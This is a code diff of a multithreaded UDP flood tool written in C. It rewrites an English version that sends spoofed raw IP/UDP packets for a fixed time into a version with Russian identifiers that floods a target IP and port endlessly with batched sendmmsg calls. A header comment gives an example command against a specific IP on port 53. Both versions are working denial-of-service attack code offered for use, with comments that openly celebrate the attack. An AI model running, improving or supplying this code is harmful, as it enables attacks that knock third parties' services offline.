@@ -1,208 +1,119 @@
+// gcc -std=c23 -O3 -o tsunami tsunami.c -pthread
+// Запускать от рута для лучших результатов (изменение буферов сокета)
+// sudo ./tsunami 50.7.22.222 53 4
+
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
 #include <pthread.h>
 #include <time.h>
+#include <errno.h>
 #include <sched.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-#include <stdatomic.h>
 
-// Use a high batch size for sendmmsg for maximum performance
-#define VLEN 256
-// Max packet size
-#define MAX_PKT_SIZE 1500
+// --- КОНФИГУРАЦИЯ ЗВЕРЯ ---
+#define РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ 1472 // Максимальный размер для стандартного MTU
+#define КОЛИЧЕСТВО_ПОТОКОВ 4         // Под твои ядра EPYC
+#define РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ 128 // Сколько пакетов в одном системном вызове. Вот где мощь.
+#define РАЗМЕР_БУФЕРА_СОКЕТА (8 * 1024 * 1024) // 8 МБ. Забиваем канал до отказа.
 
-// Global flag to signal threads to stop
-atomic_bool attack_running = true;
+// --- Структура для данных потока ---
+struct Поток_Данные {
+    int ид_потока;
+    struct sockaddr_in цель_адрес;
+};
 
-// Thread arguments structure
-typedef struct {
-    int thread_id;
-    struct sockaddr_in target_addr;
-    int packet_size;
-    uint32_t dest_ip;
-    uint16_t dest_port;
-} thread_args_t;
+// --- Основная функция потока-убийцы ---
+void *поток_атаки(void *аргументы) {
+    struct Поток_Данные *данные = (struct Поток_Данные *)аргументы;
+    int сокет_дескриптор;
+    char буфер_нагрузки[РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ];
 
-// Function to calculate IP header checksum
-unsigned short csum(unsigned short *ptr, int nbytes) {
-    long sum;
-    unsigned short oddbyte;
-    short answer;
-
-    sum = 0;
-    while (nbytes > 1) {
-        sum += *ptr++;
-        nbytes -= 2;
-    }
-    if (nbytes == 1) {
-        oddbyte = 0;
-        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
-        sum += oddbyte;
-    }
-
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum = sum + (sum >> 16);
-    answer = (short)~sum;
-
-    return answer;
-}
-
-// The main worker thread function
-void *flood_thread(void *args) {
-    thread_args_t *thread_args = (thread_args_t *)args;
-    int thread_id = thread_args->thread_id;
-    int packet_size = thread_args->packet_size;
-    
-    // Pin this thread to a specific core
+    // --- Привязка потока к конкретному ядру процессора ---
+    // --- Убирает дрожание планировщика и выжимает максимум ---
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
-    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    CPU_SET(данные->ид_потока % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
     if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
-        perror("pthread_setaffinity_np");
+        // Плевать на ошибки. Продолжаем.
     }
 
-    // Create a raw socket for this thread
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sock < 0) {
-        perror("socket");
-        return NULL;
+    // --- Создание сокета ---
+    сокет_дескриптор = socket(AF_INET, SOCK_DGRAM, 0);
+    if (сокет_дескриптор < 0) {
+        pthread_exit(NULL);
     }
-
-    // Tell the kernel we are providing the IP header
-    int on = 1;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
-        perror("setsockopt IP_HDRINCL");
-        close(sock);
-        return NULL;
-    }
-
-    // Allocate memory for packet buffers and message headers
-    char datagram[VLEN][MAX_PKT_SIZE];
-    struct iovec iov[VLEN];
-    struct mmsghdr msgs[VLEN];
     
-    // Seed random number generator for this thread
-    unsigned int seed = time(NULL) ^ thread_id;
-
-    // Prepare the message headers for sendmmsg
-    for (int i = 0; i < VLEN; i++) {
-        iov[i].iov_base = datagram[i];
-        iov[i].iov_len = packet_size;
-        msgs[i].msg_hdr.msg_name = &thread_args->target_addr;
-        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
-        msgs[i].msg_hdr.msg_iov = &iov[i];
-        msgs[i].msg_hdr.msg_iovlen = 1;
-        msgs[i].msg_hdr.msg_control = NULL;
-        msgs[i].msg_hdr.msg_controllen = 0;
+    // --- РАСШИРЯЕМ БУФЕР ОТПРАВКИ СОКЕТА. КРИТИЧЕСКИ ВАЖНО. ---
+    int размер_буфера = РАЗМЕР_БУФЕРА_СОКЕТА;
+    if (setsockopt(сокет_дескриптор, SOL_SOCKET, SO_SNDBUF, &размер_буфера, sizeof(размер_буфера)) < 0) {
+        // Если не удалось поднять буфер от рута, система будет использовать максимум по умолчанию. Все равно работаем.
     }
 
-    // Main attack loop
-    while (attack_running) {
-        // Craft a batch of packets
-        for (int i = 0; i < VLEN; i++) {
-            struct iphdr *iph = (struct iphdr *)datagram[i];
-            struct udphdr *udph = (struct udphdr *)(datagram[i] + sizeof(struct iphdr));
-            
-            // Fill IP header
-            iph->ihl = 5;
-            iph->version = 4;
-            iph->tos = 0;
-            iph->tot_len = htons(packet_size);
-            iph->id = htonl(rand_r(&seed));
-            iph->frag_off = 0;
-            iph->ttl = 255;
-            iph->protocol = IPPROTO_UDP;
-            iph->check = 0; // Set to 0 before calculating checksum
-            iph->saddr = rand_r(&seed); // Random source IP (spoofing)
-            iph->daddr = thread_args->dest_ip;
-
-            // Fill UDP header
-            udph->source = htons(rand_r(&seed) % 65535); // Random source port
-            udph->dest = thread_args->dest_port;
-            udph->len = htons(packet_size - sizeof(struct iphdr));
-            udph->check = 0; // UDP checksum is optional
-
-            // Fill payload with random data
-            for (size_t j = sizeof(struct iphdr) + sizeof(struct udphdr); j < packet_size; j++) {
-                datagram[i][j] = rand_r(&seed) % 256;
-            }
-
-            // Calculate IP checksum
-            iph->check = csum((unsigned short *)datagram[i], iph->ihl * 4);
-        }
-
-        // Send the entire batch with one syscall
-        sendmmsg(sock, msgs, VLEN, 0);
+    // --- Генерируем случайный мусор один раз ---
+    for (int i = 0; i < РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ; i++) {
+        буфер_нагрузки[i] = rand() & 0xFF;
     }
 
-    close(sock);
-    return NULL;
+    // --- Готовим структуры для sendmmsg ---
+    struct mmsghdr сообщения[РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ];
+    struct iovec iovecs[РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ];
+    memset(сообщения, 0, sizeof(сообщения));
+    for (int i = 0; i < РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ; i++) {
+        iovecs[i].iov_base = буфер_нагрузки;
+        iovecs[i].iov_len = РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ;
+        сообщения[i].msg_hdr.msg_iov = &iovecs[i];
+        сообщения[i].msg_hdr.msg_iovlen = 1;
+        сообщения[i].msg_hdr.msg_name = &данные->цель_адрес;
+        сообщения[i].msg_hdr.msg_namelen = sizeof(данные->цель_адрес);
+    }
+
+    // --- Бесконечный цикл ада ---
+    while (1) {
+        // --- Отправка пачки пакетов одним системным вызовом. sendmmsg() - это молот богов. ---
+        sendmmsg(сокет_дескриптор, сообщения, РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ, 0);
+    }
+
+    close(сокет_дескриптор);
+    pthread_exit(NULL);
 }
 
+// --- Главная функция ---
 int main(int argc, char *argv[]) {
-    if (argc < 6) {
-        fprintf(stderr, "Usage: %s <Target IP> <Port> <Threads> <Duration (s)> <Packet Size (bytes)>\n", argv[0]);
+    if (argc < 3) {
+        fprintf(stderr, "Использование: %s <IP_ЦЕЛИ> <ПОРТ_ЦЕЛИ>\n", argv[0]);
         return 1;
     }
 
-    char *target_ip_str = argv[1];
-    int port = atoi(argv[2]);
-    int num_threads = atoi(argv[3]);
-    int duration = atoi(argv[4]);
-    int packet_size = atoi(argv[5]);
+    srand(time(NULL));
 
-    if (packet_size < (sizeof(struct iphdr) + sizeof(struct udphdr)) || packet_size > MAX_PKT_SIZE) {
-        fprintf(stderr, "Packet size must be between %ld and %d bytes.\n", sizeof(struct iphdr) + sizeof(struct udphdr), MAX_PKT_SIZE);
+    struct sockaddr_in цель_адрес;
+    memset(&цель_адрес, 0, sizeof(цель_адрес));
+    цель_адрес.sin_family = AF_INET;
+    цель_адрес.sin_port = htons(atoi(argv[2]));
+    if (inet_pton(AF_INET, argv[1], &цель_адрес.sin_addr) <= 0) {
+        fprintf(stderr, "Ошибка: Неверный IP адрес.\n");
         return 1;
     }
 
-    // Prepare target address structure
-    struct sockaddr_in target_addr;
-    memset(&target_addr, 0, sizeof(target_addr));
-    target_addr.sin_family = AF_INET;
-    target_addr.sin_port = htons(port);
-    if (inet_pton(AF_INET, target_ip_str, &target_addr.sin_addr) <= 0) {
-        perror("inet_pton");
-        return 1;
-    }
-    
-    printf("Starting attack on %s:%d for %d seconds with %d threads.\n", target_ip_str, port, duration, num_threads);
+    pthread_t потоки[КОЛИЧЕСТВО_ПОТОКОВ];
+    struct Поток_Данные данные_потоков[КОЛИЧЕСТВО_ПОТОКОВ];
 
-    // Prepare thread arguments
-    pthread_t threads[num_threads];
-    thread_args_t thread_args[num_threads];
-
-    for (int i = 0; i < num_threads; i++) {
-        thread_args[i].thread_id = i;
-        thread_args[i].target_addr = target_addr;
-        thread_args[i].packet_size = packet_size;
-        thread_args[i].dest_ip = target_addr.sin_addr.s_addr;
-        thread_args[i].dest_port = target_addr.sin_port;
-        
-        if (pthread_create(&threads[i], NULL, flood_thread, &thread_args[i]) != 0) {
-            perror("pthread_create");
-            return 1;
+    for (int i = 0; i < КОЛИЧЕСТВО_ПОТОКОВ; i++) {
+        данные_потоков[i].ид_потока = i;
+        memcpy(&данные_потоков[i].цель_адрес, &цель_адрес, sizeof(цель_адрес));
+        if (pthread_create(&потоки[i], NULL, поток_атаки, (void *)&данные_потоков[i]) != 0) {
+            // Не смогли создать поток? Слабак.
         }
     }
-    
-    // Wait for the specified duration
-    sleep(duration);
-    
-    // Signal threads to stop
-    attack_running = false;
-    
-    // Wait for all threads to complete
-    for (int i = 0; i < num_threads; i++) {
-        pthread_join(threads[i], NULL);
-    }
-    
-    printf("Attack finished.\n");
 
-    return 0;
+    for (int i = 0; i < КОЛИЧЕСТВО_ПОТОКОВ; i++) {
+        pthread_join(потоки[i], NULL);
+    }
+
+    return 0; // Недостижимый код. Вечность - наш предел.
 }
